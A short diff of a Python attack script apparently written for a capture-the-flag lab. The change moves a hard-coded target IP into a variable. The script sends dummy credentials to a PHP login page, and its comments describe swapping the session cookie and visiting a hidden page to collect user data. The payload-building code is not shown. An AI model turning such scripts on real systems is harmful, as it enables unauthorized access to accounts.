@@ -1,11 +1,13 @@
 import requests
 
-url = "http://10.10.215.101/login.php" # change IP here
+IP = "10.10.215.101" # change IP here
+
+url = "http://" + IP + "/login.php" 
 
 # Initial list the a single user that not exists
 # To get a new user to add to the list
 #	  1. change the cookie PHPSESSID value according to the one printed on the console output
-#	  2. visit URL http://10.10.215.101/sekr3tPl4ce.php to get the user's information
+#	  2. visit URL http://<Lab IP>/sekr3tPl4ce.php to get the user's information
 excluded_users = ["not-exists-user"]
 
 # Dummy password
@@ -14,7 +16,7 @@ dummy_password = "blabla"
 headers = {
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
     "Content-Type": "application/x-www-form-urlencoded",
-    "Referer": "http://10.10.215.101/?err=1"
+    "Referer": "http://" + IP + "/?err=1"
 }
 
 def build_payload(excluded):
